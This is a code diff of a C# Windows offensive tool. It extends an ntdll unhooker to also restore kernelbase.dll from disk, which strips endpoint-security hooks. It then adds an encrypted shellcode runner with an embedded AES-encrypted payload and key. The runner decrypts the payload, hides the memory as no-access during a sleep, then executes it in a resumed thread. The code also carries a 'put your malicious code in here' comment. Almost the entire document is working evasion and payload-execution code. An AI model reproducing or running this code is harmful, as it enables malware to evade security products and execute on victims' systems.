@@ -1,19 +1,20 @@
 using System;
+using System.IO;
+using System.Text;
 using System.Diagnostics;
+using System.Security.Cryptography;
 using System.Runtime.InteropServices;
+using System.Threading;
 
-namespace UnhookNtdll
+namespace UnhookDll
 {
     class Program
     {
         static void Main(string[] args)
         {
-            // uncomment if testing with x64dbg
-            //Console.WriteLine("[+] Hit a key when ready...");
-            //Console.ReadLine();
 
             Debug("[+] Mapping Ntdll...");
-            IntPtr pMapping = MapNtdll();
+            IntPtr pMapping = MapModule(@"c:\windows\system32\ntdll.dll");
 
             if (pMapping == IntPtr.Zero)
             {
@@ -23,7 +24,8 @@ namespace UnhookNtdll
                 return;
             }
 
-            if (!UnhookNtdll(GetNtdllBaseAddress(), pMapping))
+            Debug("[+] Unhooking Ntdll...");
+            if (!UnhookModule(GetModuleBaseAddress("ntdll.dll"), pMapping))
             {
                 #if DEBUG
                 Console.ReadLine();
@@ -31,33 +33,119 @@ namespace UnhookNtdll
                 return;
             }
 
-            Debug("[+] Done! Have a nice day!");
+            Debug("\n[+] Mapping Kernelbase...");
+            pMapping = MapModule(@"c:\windows\system32\kernelbase.dll");
 
-            // put your malicious code in here...
+            if (pMapping == IntPtr.Zero)
+            {
+#if DEBUG
+                Console.ReadLine();
+#endif
+                return;
+            }
 
+            Debug("[+] Unhooking Kernelbase...");
+            if (!UnhookModule(GetModuleBaseAddress("kernelbase.dll"), pMapping))
+            {
+#if DEBUG
+                Console.ReadLine();
+#endif
+                return;
+            }
+
+            // put your malicious code in here... or use the encrypted shellcode runner
+            Shellcode();
             // ...
 
-            // uncomment if testing with x64dbg
-            //Console.ReadLine();
-            
+            // don't close main thread while shellcode is running
+            while (true) { Thread.Sleep(1000); }
         }
 
-        static IntPtr MapNtdll()
+        static void Shellcode()
+        {
+            // the encrypted payload and key - change this to your needs
+            // see https://github.com/plackyhacker/ShellcodeEncryptor
+            string payload = "4kRNv6IYTes83XyHrCb/7dnd+fRPCfQRof4miLBaIs3lpoqYLkkPsKGErvKXp1ohlnTJWyEFiO17HK2DzamT7SE+ELAVuJAUiExwwMHhkPIUBOQ/2pg8PkIaB3n/cEVp3E8S+xvz58bqFsbZ5SDQwIFw5hyBxgXy4HMxLCx39JplCGMKMVWmLX2I14+lS89Ep+/AyXFsm2jaggPkTxwOM/f+Fn+/IuYJ7mIguqaQ9ldgMnIrmGS2nIyyCfKTXKQrdFYDahu6YFw5D/WdJEWOD5x4xTf8aWDiIHQ6HRt79onHJSxclr+ud5aSdCyZvZbgpkzoHEjRbWtU+cBdycRAIUygQxAd/nVhJZUIK93Tizd07N3N006mFI9SCH6urbcQGKGpI916NbkhTidMxsc9I3QY0OikT/lmeHNqsZ+QaIz4RXvME5KRboTeb1ZmF5aj9xDISERCnymL4qots4uBYMO+RWP5weOhCXNPiOQ6JXcOASrUC3rUAM9qi4s0iyVdOBXZGfeItIClIXnsc1jGZQeJ9iFIHLmYIRLje4K+J3YKqOSNOBXxC4bhsb5sDe7b04vUPQ/wYQsrHMJpI/2m3wq9R4zp7+20bqYHSCTKJIeIySe4BzDgi+DtGtJDo/Jn5G+h05McYm6M1Dmw6tR9N+O8aAFr+bJsDqD124mwpeP6ApxePPsfIT6xYPaSqQLUR7VkiV8rOys3VvHEzixnMOqQsa9i9tHlqUe+THGTJARNcIwgKoesQlvLQp7WVjgSdnAuK5ougrBZzuRRE6rPiWiP3PfFJri/Cmp4wFWH+xfPxLcUBg6SmFdDRvWWj0OFSCMqMG6n3dsWycBYoWiDB6bqNqSNdKvUAPWDRCimM3tPqpl21als+ZedWaC00COznjOsQyO7rPiu+G/QMfMLI0pgOWodDUye+bp3l8X/qb6YymUWMclTethXMkWaGP77uhQ3tixeB6zIkzWSq8v+IPy10bTUH/MKr2BdE5SXShIQP+GRefIOQtu9f+Q1WVX+";
+            string key = "vJpiA966V27EQiRFdZDsOuwsEMJVLTCX";
+
+            Debug("[+] Decrypting payload...");
+            // decrypt the payload
+            byte[] buf = Decrypt(key, payload);
+
+            Debug("[+] VirtualAlloc...");
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x00003000, (uint)AllocationProtectEnum.PAGE_READWRITE);
+
+            IntPtr mahBuffer = Marshal.AllocHGlobal(buf.Length);
+            Marshal.Copy(buf, 0, mahBuffer, buf.Length);
+
+            Debug("[+] RtlMoveMemory...");
+            RtlMoveMemory(addr, mahBuffer, payload.Length);
+
+            Debug("[+] VirtualProtect (PAGE_NOACCESS)...");
+            VirtualProtect(addr, (UIntPtr)buf.Length, (UInt32)AllocationProtectEnum.PAGE_NOACCESS, out uint lpflOldProtect);           
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, IntPtr.Zero);
+
+            Debug("[+] Sleeping...");
+            Thread.Sleep(7000);
+
+            Debug("[+] VirtualProtect (PAGE_EXECUTE_READ)...");
+            VirtualProtect(addr, (UIntPtr)buf.Length, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READ, out lpflOldProtect);
+
+            Debug("[+] ResumeThread...");
+            ResumeThread(hThread);
+        }
+
+        private static byte[] Decrypt(string key, string aes_base64)
+        {
+            byte[] tempKey = Encoding.ASCII.GetBytes(key);
+            tempKey = SHA256.Create().ComputeHash(tempKey);
+
+            byte[] data = Convert.FromBase64String(aes_base64);
+
+            // decrypt data
+            Aes aes = new AesManaged();
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            ICryptoTransform dec = aes.CreateDecryptor(tempKey, SubArray(tempKey, 16));
+
+            using (MemoryStream msDecrypt = new MemoryStream())
+            {
+                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, dec, CryptoStreamMode.Write))
+                {
+
+                    csDecrypt.Write(data, 0, data.Length);
+
+                    return msDecrypt.ToArray();
+                }
+            }
+        }
+
+        static byte[] SubArray(byte[] a, int length)
+        {
+            byte[] b = new byte[length];
+            for (int i = 0; i < length; i++)
+            {
+                b[i] = a[i];
+            }
+            return b;
+        }
+
+        static IntPtr MapModule(string file)
         {
             IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
 
-            string ntdllpath = @"c:\windows\system32\ntdll.dll";
+            string dllpath = file;
             // 0x80000000 = GENERIC_READ
             // 0x00000001 = FILE_SHARE_READ
             // 3 = OPEN_EXISTING
 
-            // open the ntdll.dll file
-            IntPtr hFile = CreateFile(ntdllpath, 0x80000000, 0x00000001, IntPtr.Zero, 3, 0, IntPtr.Zero);
+            // open the dll file
+            IntPtr hFile = CreateFile(dllpath, 0x80000000, 0x00000001, IntPtr.Zero, 3, 0, IntPtr.Zero);
 
             if (hFile == INVALID_HANDLE_VALUE)
                 return IntPtr.Zero;
 
-            // create a memory map of ntdll.dll
+            // create a memory map of the dll
             // 0x02 = PAGE_READONLY
             // 0x1000000 = SEC_IMAGE
             IntPtr hFileMapping = CreateFileMapping(hFile, IntPtr.Zero, 0x02 | 0x1000000, 0, 0, null);
@@ -65,7 +153,7 @@ namespace UnhookNtdll
             if (hFileMapping == IntPtr.Zero)
                 return IntPtr.Zero;
 
-            // get the memory address of the loaded ntdll.dll file
+            // get the memory address of the loaded dll file
             // 0x04 = FILE_MAP_READ
             IntPtr pMapping = MapViewOfFile(hFileMapping, 0x04, 0, 0, 0);
 
@@ -73,26 +161,26 @@ namespace UnhookNtdll
             return pMapping;
         }
 
-        static bool UnhookNtdll(IntPtr originalNtdllAddress, IntPtr newNtdllMappingAddress)
+        static bool UnhookModule(IntPtr originalDllAddress, IntPtr newDllMappingAddress)
         {
-            Debug("[+] Original Ntdll address is 0x{0}", new string[] { originalNtdllAddress.ToString("X") });
-            Debug("[+] Mapped Ntdll address is 0x{0}", new string[] { newNtdllMappingAddress.ToString("X") });
+            Debug("[+] Original Dll address is 0x{0}", new string[] { originalDllAddress.ToString("X") });
+            Debug("[+] Mapped Dll address is 0x{0}", new string[] { newDllMappingAddress.ToString("X") });
 
             // Marshall the pointer into an IMAGE_DOS_HEADER struct
-            IMAGE_DOS_HEADER dosHdr = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(newNtdllMappingAddress, typeof(IMAGE_DOS_HEADER));
+            IMAGE_DOS_HEADER dosHdr = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(newDllMappingAddress, typeof(IMAGE_DOS_HEADER));
 
             if (dosHdr.isValid)
             {
-                Debug("[+] Mapped Ntdll is a valid image.");
+                Debug("[+] Mapped Dll is a valid image.");
             }
             else
             {
-                Debug("[!] Mapped Ntdll is NOT a valid image!");
+                Debug("[!] Mapped Dll is NOT a valid image!");
                 return false;
             }
 
             // get the address of the IMAGE_NT_HEADERS
-            IntPtr pNtHeaders = newNtdllMappingAddress + dosHdr.e_lfanew;
+            IntPtr pNtHeaders = newDllMappingAddress + dosHdr.e_lfanew;
 
             // Marshall the pointer into an IMAGE_NT_HEADERS64 struct
             IMAGE_NT_HEADERS64 ntHdrs = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNtHeaders, typeof(IMAGE_NT_HEADERS64));
@@ -102,11 +190,11 @@ namespace UnhookNtdll
 
             if (ntHdrs.isValid)
             {
-                Debug("[+] Mapped Ntdll NT Headers is valid.");
+                Debug("[+] Mapped Dll NT Headers is valid.");
             }
             else
             {
-                Debug("[!] Mapped Ntdll NT Headers is NOT valid!");
+                Debug("[!] Mapped Dll NT Headers is NOT valid!");
                 return false;
             }
 
@@ -142,23 +230,23 @@ namespace UnhookNtdll
                 secHdr = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(pCurrentSection, typeof(IMAGE_SECTION_HEADER));
             }
 
-            // change the original ntdll page to writable
-            Debug("[+] VirtualProtect Ntdll to PAGE_EXECUTE_READWRITE...");
-            bool result = VirtualProtect(originalNtdllAddress, (UIntPtr)secHdr.VirtualSize, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out UInt32 lpflOldProtect);
+            // change the original dll page to writable
+            Debug("[+] VirtualProtect Dll to PAGE_EXECUTE_READWRITE...");
+            bool result = VirtualProtect(originalDllAddress, (UIntPtr)secHdr.VirtualSize, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_READWRITE, out UInt32 lpflOldProtect);
 
             if(!result)
             {
-                Debug("[!] Unable to change Ntdll page protection!");
+                Debug("[!] Unable to change Dll page protection!");
                 return false;
             }
 
-            // copy the .text section of newly loaded DLL into original ntdll
-            Debug("[+] Unhooking Ntdll by copying mapped data...");
+            // copy the .text section of newly loaded DLL into original DLL
+            Debug("[+] Unhooking Dll by copying mapped data...");
             try
             {
                 byte[] buffer = new byte[(Int32)secHdr.VirtualSize];
-                Marshal.Copy(newNtdllMappingAddress, buffer, 0, (Int32)secHdr.VirtualSize);
-                Marshal.Copy(buffer, 0, originalNtdllAddress, (Int32)secHdr.VirtualSize);
+                Marshal.Copy(newDllMappingAddress, buffer, 0, (Int32)secHdr.VirtualSize);
+                Marshal.Copy(buffer, 0, originalDllAddress, (Int32)secHdr.VirtualSize);
             }
             catch(Exception ex)
             {
@@ -166,29 +254,29 @@ namespace UnhookNtdll
                 return false;
             }
 
-            // restore the page settings for original ntdll
-            Debug("[+] VirtualProtect Ntdll to PAGE_EXECUTE_WRITECOPY...");
-            result = VirtualProtect(originalNtdllAddress, (UIntPtr)secHdr.VirtualSize, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_WRITECOPY, out lpflOldProtect);
+            // restore the page settings for original DLL
+            Debug("[+] VirtualProtect Dll to PAGE_EXECUTE_WRITECOPY...");
+            result = VirtualProtect(originalDllAddress, (UIntPtr)secHdr.VirtualSize, (UInt32)AllocationProtectEnum.PAGE_EXECUTE_WRITECOPY, out lpflOldProtect);
 
             if (!result)
             {
-                Debug("[!] Unable to change Ntdll page protection!");
+                Debug("[!] Unable to change Dll page protection!");
                 return false;
             }
 
-            Debug("[+] Unmapping view of Ntdll...");
-            UnmapViewOfFile(newNtdllMappingAddress);
-            
+            Debug("[+] Unmapping view of Dll...");
+            UnmapViewOfFile(newDllMappingAddress);
+
             return true;
         }
 
-        static IntPtr GetNtdllBaseAddress()
+        static IntPtr GetModuleBaseAddress(string name)
         {
             Process hProc = Process.GetCurrentProcess();
 
             foreach (ProcessModule m in hProc.Modules)
             {
-                if (m.ModuleName.ToUpper().Equals("NTDLL.DLL"))
+                if (m.ModuleName.ToUpper().StartsWith(name.ToUpper()))
                     return m.BaseAddress;
             }
 
@@ -678,9 +766,36 @@ namespace UnhookNtdll
         [DllImport("kernel32.dll")]
         static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+
+        [DllImport("kernel32")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32", SetLastError = true, ExactSpelling = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+        public static extern void RtlMoveMemory(IntPtr destData, IntPtr srcData, int size);
+
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32", CharSet = CharSet.Ansi)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("coredll.dll", EntryPoint = "GetModuleHandleW", SetLastError = true)]
+        public static extern bool GetModuleHandleEx(uint flags, string moduleName, IntPtr hModule);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool FreeLibrary(IntPtr hModule);
+
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool UnmapViewOfFile(IntPtr lpBaseAddress);
-        
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hReservedNull, uint dwFlags);
+
         #endregion
 
     }
